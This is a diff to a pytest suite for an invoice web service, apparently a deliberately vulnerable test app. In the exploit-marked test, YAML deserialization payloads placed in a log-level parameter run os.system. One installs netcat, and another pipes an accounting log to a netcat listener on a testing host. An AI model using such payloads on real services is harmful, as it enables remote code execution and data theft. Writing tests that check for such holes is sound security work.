@@ -11,11 +11,15 @@ import os
 logger = logging.getLogger()
 URL = f"http://{os.environ['SERVICE_HOST']}:7354"
 
-def test_invoice_landing_page():
+def test_invoice_overview():
     params = {'name': 'do-not-exist'}
     r = requests.get(URL, params)
     assert r.status_code == 200
-    assert 'No Items' in r.text
+    assert len(r.json()['invoices']) == 0
+
+def test_invoice_overview_error_handling():
+    r = requests.get(URL)
+    assert r.status_code == 404
 
 def test_add_invoice():
     params = {'name': 'somebody', 'item': 'pizza'}
@@ -71,7 +75,7 @@ def test_setting_log_level():
     container = client.containers.get('invoices')
     old_logs = len(container.logs().decode().splitlines())
 
-    params = {'log-level': 'INFO'}
+    params = {'log-level': 'INFO', 'name': 'whoever'}
     r = requests.get(URL, params)
 
     latest_logs = container.logs().decode().splitlines()[old_logs:]
@@ -93,12 +97,12 @@ def test_invoice_log_accounting():
 
 @pytest.mark.no_pipeline_support
 @pytest.mark.exploit
-def test_exploit_landing_page():
+def test_exploit_invoice_overview():
     proc = subprocess.Popen(['nc', '-l', '7777'], stdout=PIPE)
 
-    params = {'log-level': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
+    params = {'name': 'whoever', 'log-level': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
     requests.get(url = URL, params = params)
-    params = {'log-level': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
+    params = {'name': 'whoever', 'log-level': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
     requests.get(url = URL, params = params)
 
     try:
